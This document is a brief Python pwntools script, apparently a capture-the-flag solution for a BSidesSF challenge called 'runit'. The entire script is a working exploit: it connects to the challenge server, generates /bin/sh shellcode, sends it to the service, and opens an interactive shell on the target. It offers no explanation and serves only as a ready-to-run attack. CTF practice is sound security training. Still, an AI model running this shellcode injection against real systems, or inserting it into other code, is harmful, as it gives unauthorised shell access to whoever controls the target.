#python 2.7.12

from pwn import *

log.info("Starting")
#r = process('./runit')
r = remote("runit-5094b2cb.challenges.bsidessf.net" ,5252)

s = r.recv(100)
print(s)

shellcode = asm(shellcraft.sh())

r.sendline(shellcode)
r.interactive()
